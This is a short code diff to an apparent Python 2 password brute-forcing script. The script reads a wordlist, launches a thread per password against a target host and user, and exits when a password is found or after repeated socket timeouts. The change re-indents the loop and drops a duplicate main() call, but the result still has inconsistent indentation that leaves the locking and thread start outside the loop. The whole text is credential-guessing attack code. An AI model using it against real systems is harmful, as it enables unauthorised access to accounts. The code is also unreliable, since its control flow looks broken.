@@ -45,21 +45,17 @@ def main():
 		exit(0)
 	fn = open(passwdFile, 'r')
 	for line in fn.readlines():
-	if Found:	
-		print "[*] Exiting: Password Found"
-		exit(0)
-		if Fails > 5:
-			print "[!] Exiting: Too Many Socket Timeout Attempts"
+		if Found:	
+			print "[*] Exiting: Password Found"
 			exit(0)
+			if Fails > 5:
+				print "[!] Exiting: Too Many Socket Timeout Attempts"
+				exit(0)
 	connection_lock.acquire()
-		password = line.strip('\r').strip('\n')
+	password = line.strip('\r').strip('\n')
 	print "[-] Testing: "+str(password)
-		t = Thread(target=connect, args=(host, user, password, True))
-		child = t.start()
+	t = Thread(target=connect, args=(host, user, password, True))
+	child = t.start()
 	
-
-if __name__ == '__main__':
-	main()		
-
 if __name__ == '__main__':
 	main()
